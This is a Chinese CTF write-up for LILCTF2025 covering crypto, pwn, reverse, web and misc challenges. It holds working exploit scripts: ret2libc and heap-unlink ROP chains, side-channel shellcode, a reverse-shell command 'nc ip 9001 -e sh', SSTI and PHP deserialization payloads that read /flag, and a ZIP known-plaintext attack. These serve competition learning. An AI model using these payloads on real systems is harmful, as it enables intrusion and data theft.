---
title: LILCTF2025
published: 2025-08-18
pinned: false
description: LILCTF2025，crypto，wp
tags: ['crypto']
category: CTF-crypto
licenseName: "MIT"
author: zsm
draft: false
date: 2025-08-18
pubDate: 2025-08-18
---


## 前言

rank19，略微遗憾，最后区块链没做出来，下面把wp汇总一下

## Crypto(zsm)

### ez_math

task.py

```python
from sage.all import *
from Crypto.Util.number import *
from tqdm import tqdm
from random import randint
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

flag = b'LILCTF{test_flag}'

p = getPrime(64)
P = GF(p)

key = randint(2**62, p)

def mul(vector, c):
    return [vector[0]*c, vector[1]*c, vector[2]*c, vector[3]*c, vector[4]*c]

v1 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]
v2 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]
v3 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]
v4 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]
v5 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]
a, b, c, d, e = getPrime(64), getPrime(64), getPrime(64), getPrime(64),  0

A = matrix(P, [v1, v2, v3, v4, v5])
B = matrix(P, [mul(v1,a), mul(v2,b), mul(v3, c), mul(v4, d), mul(v5, e)])
C = A.inverse() * B
D = C**key

key = pad(long_to_bytes(key), 16)
aes = AES.new(key,AES.MODE_ECB)
msg = aes.encrypt(pad(flag, 64))

print(f"p = {p}")
print(f'C = {[i for i in C]}'.replace('(', '[').replace(')', ']'))
print(f'D = {[i for i in D]}'.replace('(', '[').replace(')', ']'))
print(f"msg = {msg}")
```

矩阵B是对角矩阵L*矩阵A得到，C=A^{-1}B=A^{-1}LA，显而易见就是矩阵的相似变换，lambda1 和 lambda2 正是矩阵 C 的两个特征值，直接打就行了

exp.py

```python
from sage.all import *
from Crypto.Util.number import long_to_bytes
p = 
C_list = 
F = GF(p)

C_matrix = matrix(F, C_list)

eigenvalues = C_matrix.eigenvalues()

print(f"[*] Found eigenvalues: {eigenvalues}")

lambda_val1 = int(eigenvalues[0])
lambda_val2 = int(eigenvalues[1])

flag_part1 = long_to_bytes(lambda_val1)
flag_part2 = long_to_bytes(lambda_val2)

try:
    flag_attempt1 = b'LILCTF{' + flag_part1 + flag_part2 + b'}'
    print(f"[+] Attempt 1: {flag_attempt1.decode()}")
except UnicodeDecodeError:
    print(f"[!] Attempt 1 resulted in non-printable characters.")

try:
    flag_attempt2 = b'LILCTF{' + flag_part2 + flag_part1 + b'}'
    print(f"[+] Attempt 2: {flag_attempt2.decode()}")
except UnicodeDecodeError:
    print(f"[!] Attempt 2 resulted in non-printable characters.")

```

### mid_math

task.py

```python
from sage.all import *
from Crypto.Util.number import *

flag = b'LILCTF{test_flag}'[7:-1]
lambda1 = bytes_to_long(flag[:len(flag)//2])
lambda2 = bytes_to_long(flag[len(flag)//2:])
p = getPrime(512)
def mul(vector, c):
    return [vector[0]*c, vector[1]*c]

v1 = [getPrime(128), getPrime(128)]
v2 = [getPrime(128), getPrime(128)]

A = matrix(GF(p), [v1, v2])
B = matrix(GF(p), [mul(v1,lambda1), mul(v2,lambda2)])
C = A.inverse() * B

print(f'p = {p}')
print(f'C = {str(C).replace(" ", ",").replace("\n", ",").replace("[,", "[")}')
```

主要是求key，主要还是用eigenvalues去算特征值，然后去遍历配对CD的，然后离散求解

exp.py

```python
from sage.all import *
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import itertools
p = 
C_list =
D_list =

msg = P = GF(p)
C = matrix(P, C_list)
D = matrix(P, D_list)
eigenvalues_C = C.eigenvalues()
eigenvalues_D = D.eigenvalues()

non_zero_C = [e for e in eigenvalues_C if e != 0]
non_zero_D = [e for e in eigenvalues_D if e != 0]

found_key = None
for D_perm in itertools.permutations(non_zero_D):
    try:
        lambda_c1 = non_zero_C[0]
        lambda_d1 = D_perm[0]
        candidate_key = discrete_log(lambda_d1, lambda_c1)
        
        verified = True
        for i in range(1, len(non_zero_C)):
            lambda_ci = non_zero_C[i]
            lambda_di = D_perm[i]
            if pow(lambda_ci, candidate_key, p) != lambda_di:
                verified = False
                break
        
        if verified:
            found_key = candidate_key
            print(f"\n[+] Successfully found and verified the key!")
            print(f"    key = {found_key}")
            break
            
    except (ValueError, TypeError):
        continue

if found_key:
    key_int = int(found_key)
    aes_key = pad(long_to_bytes(key_int), 16)
    
    cipher = AES.new(aes_key, AES.MODE_ECB)
    decrypted_padded = cipher.decrypt(msg)

    flag = unpad(decrypted_padded, 64)
    
    print(f"\n[+] AES Key (bytes): {aes_key.hex()}")
    print(f"[+] Decrypted Flag: {flag.decode()}")
else:
    print("\n[-] Could not find the key.")
```


### Linear

task.py

```python
import os
import random
import signal

signal.alarm(10)

flag = os.getenv("LILCTF_FLAG", "LILCTF{default}")

nrows = 16
ncols = 32

A = [[random.randint(1, 1919810) for _ in range(ncols)] for _ in range(nrows)]
x = [random.randint(1, 114514) for _ in range(ncols)]

b = [sum(A[i][j] * x[j] for j in range(ncols)) for i in range(nrows)]
print(A)
print(b)

xx = list(map(int, input("Enter your solution: ").strip().split()))
if xx != x:
    print("Oh, your linear algebra needs to be practiced.")
else:
    print("Bravo! Here is your flag:")
    print(flag)
```

正常的格，本地是mac+kitty的组合，sage里面交互有点问题，本来想先拿数据，结果发现有时间限制，手速不够快bro，格就是个Ax=B，也就是Ay=0，这里直接算一组基，然后LLL。注意接收是收正数，判定一下

exp.py 

```python
import os
import json
from pwn import *
from sage.all import *

# 修复环境问题
os.environ['TERM'] = 'xterm'
os.environ['TERMINFO'] = '/usr/share/terminfo'

context.log_level = 'info' # 先设置为 info，如果还不行再改回 debug
p = remote('challenge.xinshi.fun', 47103)
A_str = p.recvline().decode().strip()
b_str = p.recvline().decode().strip()

try:
    A_list = json.loads(A_str)
    b_list = json.loads(b_str)
except (json.JSONDecodeError, SyntaxError):
    A_list = eval(A_str)
    b_list = eval(b_str)

Z = Integers()
A = matrix(Z, A_list)
b = vector(Z, b_list)
A_prime = A.augment(-b)
kernel = A_prime.right_kernel()
B = kernel.basis_matrix()
B_lll = B.LLL()
short_vector = B_lll[0]
payload = None

s1 = short_vector
if s1[-1] != 0:
    if s1[-1] < 0:
        s1 = -s1
    
    y1 = s1 / s1[-1]
    x1 = [int(v) for v in y1[:-1]]

    if all(v > 0 for v in x1):
        payload = ' '.join(map(str, x1))
        print("[+] Found an all-positive solution vector. This should be the one.")

if payload is None:
    s_default = short_vector
    if s_default[-1] < 0:
        s_default = -s_default
    y_default = s_default / s_default[-1]
    x_default = [int(v) for v in y_default[:-1]]
    payload = ' '.join(map(str, x_default))

print(f"[*] Sending payload: {payload[:80]}...")
p.sendlineafter(b'Enter your solution: ', payload.encode())

p.interactive()
```

### Space Travel

task.py 

```python
from hashlib import md5
from os import urandom

from Crypto.Cipher import AES

from params import vecs

key = int("".join([vecs[int.from_bytes(urandom(2)) & 0xfff] for _ in range(50)]), 2)

print("🎁 :", [[nonce := int(urandom(50*2).hex(), 16), (bin(nonce & key).count("1")) % 2] for _ in range(600)])
print("🚩 :", AES.new(key=md5(str(key).encode()).digest(), nonce=b"Tiffany", mode=AES.MODE_CTR).encrypt(open("flag.txt", "rb").read()))
```

问了一下ai，跟我说这是LPN问题，和LWE的差别在于没有e，尝试改cvp和svp的脚本，出不来，尝试爆破2**16的数量基，发现根本跑不出来，五个小时不能出来，继续改变思路，尝试打格，800但是只有600的数据，目前不太会.后面发现，加密 key 其实是通过 线性组合 vecs 表 生成的，`(nonce & key) % 2 `可以看作线性方程组中的一行（mod 2），我可以用高斯消元求出key，求出之后丢给ai分析，发现系统秩 599，有 1 个自由度，那么有一个就是flag。这里整个代码由ai编写，我只负责提供思路

exp略


### Baaaaaag


task.py 

```python
from Crypto.Util.number import *
import random
from Crypto.Cipher import AES
import hashlib
from Crypto.Util.Padding import pad
from secret import flag

p = random.getrandbits(72)
assert len(bin(p)[2:]) == 72

a = [getPrime(90) for _ in range(72)]
b = 0
t = p
for i in a:
    temp = t % 2
    b += temp * i
    t = t >> 1

key = hashlib.sha256(str(p).encode()).digest()
cipher = AES.new(key, AES.MODE_ECB)
flag = pad(flag,16)
ciphertext = cipher.encrypt(flag)

print(f'a = {a}')
print(f'b = {b}')
print(f"ciphertext = {ciphertext}")
```

一个正常的背包算是，0.8000799299496527<9.04，发现和hgame2024的题有点像，翻一下脚本，找到laz佬的，直接BKZ求不出来，加上block_size=30（越大越精准，耗时越长）

exp.py 

```
from sage.all import *

a =
bag =
print(bag)
print(len(a))
n = len(a)

# Sanity check for application of low density attack
d = n / log(max(a), 2)
print(CDF(d))
assert CDF(d) < 0.9408

M = Matrix.identity(n) * 2

last_row = [1 for x in a]
M_last_row = Matrix(ZZ, 1, len(last_row), last_row)

last_col = a
last_col.append(bag)
M_last_col = Matrix(ZZ, len(last_col), 1, last_col)

M = M.stack(M_last_row)
M = M.augment(M_last_col)

X = M.BKZ(block_size=30)

sol = []
for i in range(n + 1):
    testrow = X.row(i).list()[:-1]
    if set(testrow).issubset([-1, 1]):
        for v in testrow:
            if v == 1:
                sol.append(0)
            elif v == -1:
                sol.append(1)
        break

s = sol
print(s)

```

## Pwn(vrtua)

### Signin

简单ret2libc

```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

ru(b"name?")
s(
    b"a" * 0x78
    + p(0x000401176)
    + p(elf.got["puts"])
    + p(0x0000000000401060)
    + p(0x0000000000401178)
)
rl()
base = u(r(6).ljust(8, b"\0")) - 0x0000000000080E50
success(hex(base))
system = base + 0x0000000000050D70
binsh = base + 0x00000000001D8678
payload = b"a" * 0x78 + p(0x000401176) + p(binsh) + p(0x000000000040101A) + p(system)
s(payload)
ia()
```

### heappivot

增删改静态堆，0x100固定大小uaf，根据题目描述为2.23版本，故可通过打unlink造成`heaplist[i] = &heaplist`实现任意写

没有输出函数，于是打`stdout + freehook(fflush)泄`露environ，然后通过任意写去打栈

```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""


def menu():
    ru(b"Your choice:\n")


def alloc(idx, content=b"a\n"):
    menu()
    sl(b"1")
    ru(b"idx:")
    sl(str(idx))
    ru(b"say\n")
    s(content)


def free(idx):
    menu()
    sl(b"2")
    ru(b"idx:")
    sl(str(idx))


def edit(idx, content):
    menu()
    sl(b"3")
    ru(b"idx:")
    sl(str(idx))
    ru(b"context: ")
    s(content)


b("set glibc 2.23")
# max_fast = 0x00000000006CC638
free_list = 0x00000000006CC628
heap_list = 0x6CCD60
main_arena = 0x6CA858
free_hook = 0x6CC5E8
flush_all = 0x000000000416770
_mprotect = 0x0000000004407F0
_readin = 0x00000000043FCA0
stdout = 0x00000000006CA300
alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
alloc(1)
alloc(4)
free(0)
free(2)
free(1)

edit(0, p(0) + p8(0x80))  # p8(0xC0))
edit(2, p(0) + p(0x111) + p(0) + p(0x6CCD60 + 0x8 * 6))
alloc(4)
alloc(4, b"a" * 0xF0 + p(0x100) + p(0x110))
edit(2, p(0) + p(0x101) + p(0x6CCD60 - 8) + p(0x6CCD60))

free(3)# trigger unlink

edit(2, p(0) + p(0x6CC5E8) + p8(0xE0))  # free_hook
payload = p(0) + p(0x20) + p(0) * 2 + p(0x21) * 2 + p(0) * 2 + p(0x21) * 2
edit(1, payload)
edit(0, p(flush_all))
edit(2, p(0) + p(0x6CCD90))
payload = (p(0) + p(0x90) + 2 * p(main_arena)).ljust(0x90, b"\0") + p(0x91) + p(0x91)
edit(0, payload)
edit(2, p(0) + p(stdout))
io_padding = 0x00000000006CA383
environ = 0x00000000006CC640
payload = p(0xFBAD1800) + p(io_padding) * 3 + p(environ) + p(environ + 6) * 2
edit(0, payload)
edit(0, payload)
alloc(0)
free(0)
stack = u(r(6).ljust(8, b"\0")) - 0x180
success(hex(stack))

prdi = 0x0000000000401A16
prsi = 0x0000000000401B37
prdx = 0x0000000000443136
dest = 0x6CC000
payload = (
    p(prdi)
    + p(dest)
    + p(prsi)
    + p(0x100)
    + p(prdx)
    + p(7)
    + p(_mprotect)
    + p(prdi)
    + p(0)
    + p(prsi)
    + p(dest)
    + p(prdx)
    + p(0x100)
    + p(_readin)
    + p(dest)
)

edit(2, p(0) + p(stack))
edit(0, payload)

shellcode = shellcraft.open("./flag")
shellcode += shellcraft.read("rax", "rsp", 0x30)
shellcode += shellcraft.write(1, "rsp", 0x30)
shellcode = asm(shellcode)
s(shellcode)

ia()
```

### The Truman Show

shellcode，题目仅允许使用5个指定syscall并只能输入0x23长的shellcode

```
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x0000003c  if (A == exit) goto 0010
 0007: 0x15 0x02 0x00 0x00000053  if (A == mkdir) goto 0010
 0008: 0x15 0x01 0x00 0x000000a1  if (A == chroot) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

首先肯定需要openat和read两个调用先读出flag，因为没有输出故考虑侧信道泄露flag
只给了0x23长，shellcode写的有点极限
因为ban了cmp立即数字节，使用sub代替
题目ban掉了`8,9,;,:这`几个字符，如果flag包含这些字符会有影响，于是先泄露出没ban的字符，得到flag：`LILCTF{64_6df56-2dbf-4c0d-a_cd-1_4c__f_f_a3}`

接着继续优化shellcode，省出两个字节后在jz前增加一条sub one_byte_of_flag, 1避免输入违禁字符导致过滤
将未知字符一个一个泄露出来后最终得到flag：`LILCTF{6496df56-2dbf-4c0d-a9cd-194c98f9f8a3}`

```python
from pwnfunc import *

def single_exp(single_char, idx):
    # single_char = "7"
    io, elf, libc = pwn_initial()
    set_context(term="tmux_split", arch="amd64")
    """amd64 i386 arm arm64 riscv64"""

    shellcode = (
        f"mov al, byte ptr [rsp + {hex(idx)}]\n"
        # + "sub al, 1\n"
        + "sub al, "
        + hex(ord(single_char))
    )
    info("current flag: " + Flag)
    info(shellcode)
    shellcode = asm(shellcode)
    ru(b"Now it's your show time\n")

    s(shellcode_of_open_read + shellcode + shellcode_of_loop)

    try:
        data_from_server = io.recv(timeout=10)
        io.close()
    except EOFError:
        io.close()
        info("got eof error")
        return False
    except TimeoutError:
        io.close()
        info("got time out error")
        return True
    if data_from_server == b"":
        info("empty respond")
        return True


context.arch = "amd64"
shellcode_of_open_read = asm(
    """
pop rdx
pop rdx
mov ax, 257
push 2
pop rdi
push 0x67616c66
push rsp
pop rsi
syscall

xchg edi, eax
xchg edx, eax
xchg r11, rdx
syscall
"""
)
shellcode_of_loop = asm("jz short $")
Flag = "LILCTF{"
#       LILCTF{64_6df56-2dbf-4c0d-a_cd-1_4c__f_f_a3} # raw
#       LILCTF{6496df56-2dbf-4c0d-a9cd-194c98f9f8a3} # manually fixed
idx = len(Flag)
Break = False
priority_ranges = [
    (123, 123),  # {
    (125, 125),  # }
    (95, 95),  # _
    (45, 45),  # -
    (48, 57),  # 0-9
    (97, 122),  # a-z
    # (65, 90),  # A-Z
]

# 2. 剩余可见ASCII字符（32-126，排除已检测的）
all_visible_codes = range(32, 127)
priority_codes = {
    code for (start, end) in priority_ranges for code in range(start, end + 1)
}
remaining_codes = [code for code in all_visible_codes if code not in priority_codes]

# 3. 主循环：先检测优先字符，再检测剩余字符
while not Break:
    for start, end in priority_ranges:
        for code in range(start, end + 1):
            char = chr(code)

            info(f"Checking char: {char} (priority)")
            if single_exp(char, idx):
                Flag += char
                idx += 1
                success(f"Found: {char} at position [{idx-1}]")
                success(Flag)
                if char == "}":
                    Break = True
                    break
                break
        else:
            continue
        break  # 找到字符，跳出 priority_ranges 循环
    else:  # 如果 priority_ranges 全部未找到，尝试剩余字符
        # for code in remaining_codes:
        #     char = chr(code)
        #     info(f"Checking char: {char} (remaining)")
        #     if single_exp(char, idx):
        #         Flag += char
        #         idx += 1
        #         success(f"Found: {char} at position [{idx-1}]")
        #         success(Flag)
        #         if char == "}":
        #             Break = True
        #         break  # 找到字符，进入下一位置
        # else:  # 所有字符均未找到，可能出错
        info("No valid character found!")
        Flag += "_"  # banned char, in range of 8 and 9
        idx += 1
info("end of side-channel attack")
success(Flag)
ia()

```

## Re(zsm) 

### ARM ASM 

先把apk解包，拿到hahaha那个so文件，扔ida里面可以看见逻辑
1.输入字符串长度必须是48字符
2.对每16字节进行一系列NEON指令操作（置换表变换和异或）
3.对每3字节进行位运算操作
4.最后进行Base64编码
然后jadx启动，可以找到密文是KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S，写个脚本

```python
import base64

def decode_custom_base64(encoded_str, custom_base64_chars):
    standard_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    translation_table = str.maketrans(custom_base64_chars, standard_chars)

    standard_encoded = encoded_str.translate(translation_table)
    
    # 解码
    try:
        decoded_bytes = base64.b64decode(standard_encoded)
        return decoded_bytes
    except Exception as e:
        print(f"Base64解码失败: {e}")
        return None

def reverse_bit_operations(data):
    result = bytearray(data)
    
    for j in range(0, len(result), 3):
        if j + 2 < len(result):

            original_j = ((result[j] & 0x07) << 5) | ((result[j] & 0xF8) >> 3)
            
            original_j1 = ((result[j + 1] & 0x7F) << 1) | ((result[j + 1] & 0x80) >> 7)

            result[j] = original_j & 0xFF
            result[j + 1] = original_j1 & 0xFF
    
    return bytes(result)

def reverse_neon_operations(data):
    t = [0xD, 0xE, 0xF, 0xC, 0xB, 0xA, 9, 8, 6, 7, 5, 4, 2, 3, 1, 0]

    reverse_t = [0] * 16
    for i in range(16):
        reverse_t[t[i]] = i
    
    result = bytearray(data)
    
    v10 = bytearray(t)

    v10_states = [bytearray(v10)]
    for i in range(3):
        for j in range(16):
            v10[j] ^= i
        v10_states.append(bytearray(v10))
    
    for i in range(2, -1, -1):
        current_v10 = v10_states[i]

        block_start = 16 * i
        block_data = result[block_start:block_start + 16]

        for j in range(16):
            block_data[j] ^= current_v10[j]

        original_block = bytearray(16)
        for j in range(16):
            if current_v10[j] < 16:
                original_block[current_v10[j]] = block_data[j]
        
        result[block_start:block_start + 16] = original_block
    
    return bytes(result)

def solve_flag():
    encrypted_flag = "KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S"

    custom_base64 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/"

    decoded_data = decode_custom_base64(encrypted_flag, custom_base64)
    if decoded_data is None:
        print("Base64解码失败")
        return
    after_bit_reverse = reverse_bit_operations(decoded_data)
    print(f"逆向位运算后: {after_bit_reverse.hex()}")
    flag_bytes = reverse_neon_operations(after_bit_reverse)
    print(f"最终结果: {flag_bytes.hex()}")
    
    try:
        flag = flag_bytes.decode('ascii')
        print(f"Flag: {flag}")
    except UnicodeDecodeError:
        simple_flag = simple_reverse(encrypted_flag, custom_base64)
        if simple_flag:
            print(f"简化逆向结果: {simple_flag}")

if __name__ == "__main__":
    solve_flag()
```

### 1'M no7 A rO6oT

直接访问，看f12，里面有个mp3的链接，直接curl -O下来，binwalk可以分离出来一个图片，没什么用，用沙箱分析，发现mp3里面有个js文件

010打开后找到下面是个文件提取出来，提取出来，整个是个混淆文件，扔给gpt展示ai神力

![re1](/images/lil1.png)

这个链接是个图片，下载下来，丢到010里面，看不懂的混淆，盲猜是给一些字符赋值了，然后利用了字符变量构建命令，直接让gpt帮忙写个脚本把混淆去掉，然后把里面的base64串拉出来解密，大概率就是flag和马要执行的命令

```
import re
import base64

def solve_powershell_obfuscation(payload):
    ps_vars = {
        'u': '0', 'b': '1', 'q': '2', 'z': '3', 'o': '4',
        'd': '5', 'x': '6', 'e': '7', 'i': '8', 'l': '9',
    }

    print("[+] Step 1: Deobfuscating the first layer (character substitution)...")
    
    # 2. 将混淆字符串分割成单独的字符代码块
    # 移除了头尾的 'g' 字符，并按 '+' 分割
    char_codes_str = payload.replace('$g', 'g').split('+')
    
    decoded_command = ""
    for code_block in char_codes_str:
        # 移除标识符 'g'
        if code_block.startswith('g'):
            code_block = code_block[1:]
        
        num_str = ""
        # 逐字符替换为数字
        for char_var in code_block:
            if char_var in ps_vars:
                num_str += ps_vars[char_var]
            else:
                # 处理可能的多字符变量名（在此脚本中不存在，但作为健壮性考虑）
                print(f"Warning: Character '{char_var}' not found in variable map.")

        if num_str:
            try:
                # 将拼接好的数字字符串转为整数，再转为ASCII字符
                decoded_command += chr(int(num_str))
            except ValueError:
                print(f"Warning: Could not convert '{num_str}' to an integer.")

    print("[+] Step 1 complete. Deobfuscated PowerShell command:")
    print("-" * 50)
    print(decoded_command)
    print("-" * 50)
    
    # 3. 从解密后的命令中提取Base64字符串
    print("\n[+] Step 2: Extracting Base64 encoded payload from the command...")
    # 使用正则表达式查找 Base64 字符串
    match = re.search(r"::FromBase64String\('([^']+)'\)", decoded_command)
    
    if not match:
        print("[-] Error: Could not find the Base64 string in the deobfuscated command.")
        return

    base64_payload = match.group(1)
    print(f"[+] Found Base64 payload (starts with: '{base64_payload[:20]}...').")

    # 4. 解码Base64并保存为文件
    print("\n[+] Step 3: Decoding Base64 and saving the .NET assembly...")
    try:
        assembly_bytes = base64.b64decode(base64_payload)
        
        # 验证文件头 (MZ)，确认是可执行文件
        if assembly_bytes.startswith(b'MZ'):
            print("[+] Payload is a valid Windows executable (MZ header found).")
        
        output_filename = "payload.dll"
        with open(output_filename, "wb") as f:
            f.write(assembly_bytes)
        
        print(f"[+] Successfully saved the .NET assembly as '{output_filename}'.")
        
        # 5. 提供下一步指示
        print("\n[+] Final Step: Manual Analysis")
        print("The flag is located inside the extracted 'payload.dll' file.")
        print("To find it, you need a .NET decompiler. Follow these steps:")
        print("  1. Download and open a decompiler like 'dnSpy' or 'ILSpy'.")
        print("  2. Open the 'payload.dll' file in the decompiler.")
        print("  3. Navigate to the class 'FVVwzcy.kF'.")
        print("  4. Find and examine the method named 'QF'.")
        print("  5. The flag will be visible inside this method's code.")

    except base64.binascii.Error as e:
        print(f"[-] Error: Failed to decode Base64 string. {e}")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")


if __name__ == '__main__':
    # 将题目中的长字符串粘贴到这里
    obfuscated_payload = "z$x+...（这里省略了题目中的超长字符串）...i+g$b$u$i" 
    # 为了运行，请将上面这行替换为完整的混淆字符串
    # 示例（只包含前几个字符用于演示）
    obfuscated_payload =""
    # 由于原始字符串太长，这里我们用一个截断的占位符
    # 在实际使用时，请确保替换为完整的字符串
    if "..." in obfuscated_payload:
        print("Please replace the placeholder payload with the full obfuscated string from the challenge.")
    else:
        # 清理变量前的 '$' 符号
        cleaned_payload = obfuscated_payload.replace('$', '')
        solve_powershell_obfuscation(cleaned_payload)
```

## Web(zsm&bananas)

### Ekko_note

先看看源码，发现命令执行可以弹shell，uuid8的seed被random覆盖掉了，先拿到时间戳，在server_info接口，然后生成token，这里pyenv安装py3.14dev 

```python
import random
import time
import uuid

SERVER_START_TIME = 1755269036.9640567 # <--- 替换成你获取到的值

def padding(input_string):
    byte_string = input_string.encode('utf-8')
    if len(byte_string) > 6:
        byte_string = byte_string[:6]
    padded_byte_string = byte_string.ljust(6, b'\x00')
    padded_int = int.from_bytes(padded_byte_string, byteorder='big')
    return padded_int

random.seed(SERVER_START_TIME)

admin_username = 'admin'
padded_admin_int = padding(admin_username)

predicted_token = str(uuid.uuid8(a=padded_admin_int))

print(f"Server Start Time Seed: {SERVER_START_TIME}")
print(f"Admin's Padded Integer: {padded_admin_int}")
print(f"The One and Only Predicted Token: {predicted_token}")

```

然后更改admin的密码，然后webhook开一个，时间json改成{"date": "2067-08-15T12:00:00"}，复制url填到题目的api，然后nc ip 9001 -e sh弹shell，根目录下flag

### EZ_bottle

通过题目很明显的看到这是bottle框架下的SSTI，通过上传zip文件，然后解压zip文件对里面文件的内容进行渲染。但是办掉了{}和<%%>,那么我们就只能通过%0a%%20来进行SSTI，一开始的时候并不顺利，因为无论怎么样都无法回显，以为是无回显，尝试无果后仔细想想，之所以没有回显可能是因为回显都存进报错信息里了，所以我们只需要想办法读取报错信息就可以将flag带外出来
上传脚本如下

```python
import requests
import zipfile
import os

# 配置信息
source_file = "2.tpl"  # 要压缩的文件
zip_file = "temp.zip"   # 临时zip文件
upload_url = "http://challenge.xinshi.fun:42366/upload"

# 创建zip文件
with zipfile.ZipFile(zip_file, 'w') as zf:
    zf.write(source_file)

# 上传文件
with open(zip_file, 'rb') as f:
    res=requests.post(upload_url, files={'file': (zip_file, f)})
    print(res.text)

# 清理临时文件
os.remove(zip_file)
```

然后编写的SSTI文件如下
>% raise Exception(ºpen('/flag').read()) 

open函数因为被办掉了，所以我们使用之前XYCTF2025中学到的斜体字进行绕过即可读取到flag 

### Your Uns3r

可以看到有个include函数可以用作任意文件读取，因此接下来的目标就是构造getToken的内容
然后审计getToken发现，我们只要构造result就可以实现任意文件读取

往下看能看见有一个waf拦截

可以看到有个逻辑漏洞，这里用的是与关系，也就是说，两个判定条件只要有一个不成立，这个waf就完全没有效果。看向第一个条件判断，username等于admin是弱比较，可以使用`username=0来`进行绕过

可以看到是成立的，那么我们username=admin这一块不成立的话，Access就没必要去绕过了。

接下来可以看到，getToken这个类里头有一个lilctf的拼接，这里使用伪协`议php://filter/convert.base64-encode/xxxxx/resource=xxx`,

通过伪协议的在encode和resource之前添加任何东西，结果不变的特性，即可绕过这个添加效果。
然后就是可以看到最后一行有一个GC回收，这个直接使用数组绕过即可

```
throw new Exception("nonono!!!");
```

所以我们就可以直接构造如下Payload

```php
<?php
class User
{
    public $username = 0; 
    public $value;
}
class Access
{
    protected $prefix;
    protected $suffix;
    public function __construct()
    {
        $this->prefix = 'php://filter/convert.base64-encode/';
        $this->suffix = '/resource=../../../../../flag';
    }
}
$access = new Access();
$user = new User();
$user->value = serialize($access);
$payload=array($user,0);
echo serialize($payload);

```

## Misc(emm&clubsspades)

### 是谁没有阅读参赛须知？

f12搜一下

### v我50(R)MB 

题目进去后对源码审计发现头像处是一张webp格式的图片但是发现图片不全，用010查看发现图片其实应该是png格式的，并且发现图片并不全

![misc1](/images/misc1.png)
![misc2](/images/misc2.png)

然后对网络进行审计发现图片是靠一个api接口加载出来的，使用burpsuite审计这个接口

发现accept申请过webp，因为原图片是png，可以尝试把accept中的除了apng部分都删掉，看见png尾巴了，curl下来

![misc3](/images/misc3.png)

### PNG Master

010查看，文件尾多余数据得到flag1.（并且观察到根据png模板运行结果多了一个IDAT块，猜测zlib隐写）
Stegsolve rgb三通道置零得到flag2.

尝试zsteg工具一把梭，三个隐写一目了然。然后将IDAT块的数据提取出来用cyberchef解，得到hint和secret.bin  ，hint是零宽字符隐写，写个脚本跑一下得到flag3

### 提前放出附件

那道题发现压缩方式和加密算法是可以明文的，分析文件，

发现是tar，看文件名猜测被归档的可能是flag或者是flag.txt，手工做两个tar的文件头

![misc4](/images/misc4.png)

用bkcrack进行明文攻击

```
.\bkcrack.exe -C 1.zip -c flag.tar -p flag.tar
bkcrack 1.7.0 - 2024-05-26
[20:06:13] Z reduction using 7 bytes of known plaintext
100.0 % (7 / 7)
[20:06:13] Attack on 831507 Z values at index 6
Keys: 945815e7 4e7a2163 e46b8f88
79.2 % (658949 / 831507)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 658949
[20:10:33] Keys
945815e7 4e7a2163 e46b8f88
 .\bkcrack.exe -C 1.zip -k 945815e7 4e7a2163 e46b8f88 -u .\2.zip 1234
bkcrack 1.7.0 - 2024-05-26
Arguments error: unknown option -u.
Run 'bkcrack -h' for help.
.\bkcrack.exe -C 1.zip -k 945815e7 4e7a2163 e46b8f88 -U .\2.zip 1234
bkcrack 1.7.0 - 2024-05-26
[20:12:29] Writing unlocked archive .\2.zip with password "1234"
100.0 % (1 / 1)
Wrote unlocked archive.
```

把密码改成1234，直接就拿到flag了
